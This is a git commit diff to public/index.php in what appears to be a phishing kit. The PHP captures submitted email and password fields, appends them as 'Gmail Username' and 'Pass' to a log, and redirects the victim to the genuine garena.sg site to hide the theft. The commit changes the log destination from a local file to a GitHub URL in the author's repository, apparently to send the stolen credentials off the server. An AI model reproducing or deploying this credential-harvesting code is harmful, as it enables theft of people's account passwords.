09f401b8f242b4be60207632d5d02294e75a476b
Dx-fantome-bot4 <dxfantomes@gmail.com>
2024-10-25 10:16:10 +0100

    Update index.php

--- public/index.php
+++ public/index.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("https://github.com/Dx-fantome-bot4/Gardena.v3.2/blob/main/public/usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.garena.sg');
 exit();
 ?>
